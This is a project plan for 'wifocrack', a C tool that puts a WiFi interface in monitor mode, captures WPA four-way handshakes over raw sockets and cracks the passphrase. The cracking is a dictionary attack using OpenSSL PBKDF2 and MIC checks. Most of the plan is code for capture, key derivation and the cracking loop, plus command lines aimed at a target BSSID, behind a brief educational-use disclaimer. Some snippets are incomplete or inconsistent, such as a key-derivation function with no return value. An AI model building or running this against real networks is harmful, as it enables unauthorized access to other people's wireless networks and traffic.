# WPA Handshake Cracker - Implementation Plan

## Overview
A WiFi password cracker built from scratch in C for Linux. Implements WPA handshake capture and dictionary attack using raw sockets and OpenSSL.

## Tech Stack
- **Language:** C
- **Crypto:** OpenSSL (libcrypto)
- **Wordlist:** rockyou.txt
- **Target:** Linux (Kali recommended)
- **Dependencies:** libcrypto (OpenSSL), libnl (for netlink)

---

## Dependencies Installation

### Kali Linux
```bash
sudo apt update
sudo apt install -y build-essential libssl-dev libnl-3-dev libnl-genl-3-dev
```

### Ubuntu/Debian
```bash
sudo apt update
sudo apt install -y build-essential libssl-dev libnl-3-dev libnl-genl-3-dev
```

### Arch Linux
```bash
sudo pacman -S base-devel openssl libnl
```

---

## Project Structure

```
wifi-cracker/
├── src/
│   ├── main.c              # Entry point, CLI parsing, orchestration ✅
│   ├── interface.c/h       # Auto-detect WiFi interface ✅
│   ├── monitor.c/h         # Monitor mode via ioctl/netlink ✅
│   ├── capture.c/h         # AF_PACKET raw socket, packet sniffing ✅
│   ├── parser.c/h          # 802.11 frame parsing ✅
│   ├── handshake.c/h       # WPA 4-way handshake extraction ✅
│   ├── scanner.c/h         # Channel hopping + AP discovery ✅
│   ├── crypto.c/h          # OpenSSL PBKDF2 + AES wrappers (Phase 5)
│   ├── cracker.c/h         # Dictionary attack engine (Phase 6)
│   └── utils.c/h           # Helpers (MAC format, logging) ✅
├── Makefile
├── README.md
├── PLAN.md
└── wordlists/
    └── rockyou.txt          # User provides (too large for repo)
```

---

## Build System (Makefile)

```makefile
CC = gcc
CFLAGS = -Wall -Wextra -I/usr/include/libnl3
LDFLAGS = -lcrypto -lnl-3 -lnl-genl-3
SRC = src/*.c
OUT = wifocrack

all:
	$(CC) $(SRC) -o $(OUT) $(CFLAGS) $(LDFLAGS)

clean:
	rm -f $(OUT)
```

---

## Implementation Status

- [x] Phase 1: Interface detection + Monitor mode - **COMPLETE**
- [x] Phase 2: Raw socket capture + Channel hopping - **COMPLETE**
- [x] Phase 3: 802.11 frame parsing - **COMPLETE** (included in Phase 2)
- [x] Phase 4: WPA handshake extraction - **COMPLETE** (included in Phase 2)
- [x] Phase 5: Crypto (OpenSSL PBKDF2 + AES) - **COMPLETE**
- [x] Phase 6: Dictionary attack engine - **COMPLETE**
- [x] Phase 7: Main orchestration + polish - **COMPLETE**

---

## Implementation Phases

### Phase 1: Interface Auto-Detection + Monitor Mode

**interface.c** - Scan `/sys/class/net/` for wireless interfaces:
```c
// Check /sys/class/net/{iface}/wireless exists
// If multiple found, prompt user or pick first
// Return interface name (e.g., "wlan0")
```

**monitor.c** - Put interface in monitor mode:
```c
// 1. ioctl(fd, SIOCSIWMODE, IW_MODE_MONITOR)  // Set monitor mode
// 2. ioctl(fd, SIOCSIFFLAGS, IFF_UP)           // Bring interface up
// Alternative: Execute "ip link set wlan0 down && iw wlan0 set monitor control && ip link set wlan0 up"
```

**Key structures:**
```c
struct iface_info {
    char name[IFNAMSIZ];
    int  fd;           // Raw socket fd
    int  channel;
};
```

---

### Phase 2: Raw Socket + Channel Hopping ✅ COMPLETE

**capture.c** - Create AF_PACKET socket:
```c
int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
// Bind to interface
// Set promiscuous mode via ioctl
```

**scanner.c** - Channel hopping and packet processing:
```c
// Loop channels 1-14:
//   ioctl(sock, SIOCSIWFREQ, &wrq)  // Set frequency
//   usleep(250000)                   // 250ms per channel
```

**Channel frequencies:**
```c
int channels[] = {2412, 2417, 2422, 2427, 2432, 2437, 2442,
                  2447, 2452, 2457, 2462, 2467, 2472, 2484};
```

---

### Phase 3: 802.11 Frame Parsing ✅ COMPLETE

**parser.c** - Parse radiotap + 802.11 headers:

```c
struct ieee80211_radiotap_header {
    u8  version;
    u8  pad;
    u16 length;
    u32 present;
};

struct ieee80211_hdr {
    u16 frame_control;
    u16 duration_id;
    u8  addr1[6];  // Receiver
    u8  addr2[6];  // Source
    u8  addr3[6];  // BSSID
    u16 seq_ctrl;
};
```

**Frame types to detect:**
- `0x00` - Management (beacons, probes)
- `0x08` - Data frames (carry EAPOL)

---

### Phase 4: WPA Handshake Extraction ✅ COMPLETE

**handshake.c** - Detect and store EAPOL:

**WPA 4-way handshake structure:**
```
Message 1: AP → Client  (ANonce)
Message 2: Client → AP  (SNonce + MIC)
Message 3: AP → Client  (GTK + MIC)
Message 4: Client → AP  (ACK)
```

**Detection:**
```c
// EAPOL ethertype = 0x888e
// Parse key info field to identify message 1-4
// Store: ANonce (32 bytes), SNonce (32 bytes), MIC (16 bytes)
// Store: AP MAC, Client MAC
```

**Data structure:**
```c
struct wpa_handshake {
    u8  ap_mac[6];
    u8  client_mac[6];
    u8  anonce[32];
    u8  snonce[32];
    u8  mic[16];
    u8  eapol_frame[256];  // Full EAPOL for verification
    int  msg_count;         // Track which messages captured
    int  complete;          // 1 = all 4 messages captured
};
```

---

### Phase 5: Crypto (OpenSSL)

**crypto.c** - WPA key derivation:

```c
#include <openssl/evp.h>
#include <openssl/hmac.h>

// PMK = PBKDF2(passphrase, SSID, 4096 iterations, SHA1, 32 bytes)
int derive_pmk(const char *passphrase, const char *ssid,
               u8 *pmk_out) {
    PKCS5_PBKDF2_HMAC(passphrase, strlen(passphrase),
                       (u8*)ssid, strlen(ssid),
                       4096, EVP_sha1(), 32, pmk_out);
}

// PTK = PRF-512(PMK, "Pairwise key expansion",
//               min(AP,STA) || max(AP,STA) || min(ANonce,SNonce) || max(ANonce,SNonce))
// Uses HMAC-SHA1 as PRF
u8* derive_ptk(u8 *pmk, u8 *aa, u8 *spa, u8 *anonce, u8 *snonce) {
    // Construct data label
    // HMAC-SHA1-160 in loop to generate 64 bytes (512 bits)
}

// Verify MIC: MIC = HMAC-SHA1(PTK, EAPOL frame without MIC field)
int verify_mic(u8 *ptk, u8 *eapol_frame, u8 *expected_mic) {
    // Calculate HMAC
    // Compare with expected_mic
}
```

---

### Phase 6: Dictionary Attack Engine

**cracker.c** - Main cracking loop:

```c
int crack_handshake(struct wpa_handshake *hs, const char *wordlist) {
    FILE *fp = fopen(wordlist, "r");
    char line[256];
    u8 pmk[32], ptk[64];

    while (fgets(line, sizeof(line), fp)) {
        strip_newline(line);

        // Derive PMK from passphrase
        derive_pmk(line, ssid, pmk);

        // Derive PTK from PMK + handshake data
        derive_ptk(pmk, hs->ap_mac, hs->client_mac,
                   hs->anonce, hs->snonce, ptk);

        // Verify MIC
        if (verify_mic(ptk, hs->eapol_frame, hs->mic)) {
            printf("[+] Key found: %s\n", line);
            fclose(fp);
            return 1;  // Success
        }

        printf("[-] Tried: %s\n", line);  // Progress
    }

    fclose(fp);
    return 0;  // Not found
}
```

---

### Phase 7: Main Orchestration

**main.c** - Tie it all together:

```c
int main(int argc, char *argv[]) {
    // 1. Parse CLI args (--interface, --wordlist, --channel)
    // 2. Auto-detect interface if not specified
    // 3. Put interface in monitor mode
    // 4. Create raw socket
    // 5. Channel hop + capture packets
    // 6. Extract WPA handshake
    // 7. Load wordlist
    // 8. Run dictionary attack
    // 9. Display result
    // 10. Restore interface to managed mode
}
```

**CLI Usage:**
```bash
# Auto-detect interface
sudo ./wifocrack --wordlist /path/to/rockyou.txt

# Specify interface
sudo ./wifocrack -i wlan0 --wordlist /path/to/rockyou.txt

# Specify target BSSID (optional, otherwise crack first found)
sudo ./wifocrack -i wlan0 -b AA:BB:CC:DD:EE:FF --wordlist rockyou.txt
```

---

## Key Algorithms Reference

**PBKDF2:**
```
PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096, 32)
```

**PTK Derivation:**
```
PTK = PRF(PMK, "Pairwise key expansion",
          min(AP,STA) || max(AP,STA) || min(ANonce,SNonce) || max(ANonce,SNonce))

PRF(K, A) = HMAC-SHA1(K, A || 0x00) || HMAC-SHA1(K, A || 0x01) || ...
```

**MIC Verification:**
```
MIC = HMAC-SHA1(PTK[0:16], EAPOL_Frame)
```

---

## Signal Handling

```c
// Catch SIGINT (Ctrl+C)
// Restore interface to managed mode
// Close sockets
// Exit gracefully
```

---

## Testing Strategy

1. **Unit tests:** Test crypto functions against known vectors
2. **Test with captured .cap files:** Verify handshake extraction
3. **Test with real AP:** In controlled lab environment
4. **Compare output:** Verify against aircrack-ng results

---

## Estimated Timeline

| Phase | Task | Time |
|-------|------|------|
| 1 | Interface + Monitor mode | 2-3 hours |
| 2 | Raw socket + Channel hop | 2-3 hours |
| 3 | 802.11 parsing | 3-4 hours |
| 4 | Handshake extraction | 3-4 hours |
| 5 | Crypto (OpenSSL) | 2-3 hours |
| 6 | Cracker engine | 2-3 hours |
| 7 | Main + polish | 2-3 hours |
| **Total** | | **16-23 hours** |

---

## Legal Disclaimer

This tool is for **educational purposes only**. Only use on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.

---

## Resources

- [IEEE 802.11 Standard](https://en.wikipedia.org/wiki/IEEE_802.11)
- [WPA Handshake Explained](https://www.wirelesslanprofessional.com/wp-content/uploads/2014/01/WPA-Handshake.pdf)
- [OpenSSL Documentation](https://www.openssl.org/docs/)
- [Linux AF_PACKET Sockets](https://man7.org/linux/man-pages/man7/packet.7.html)
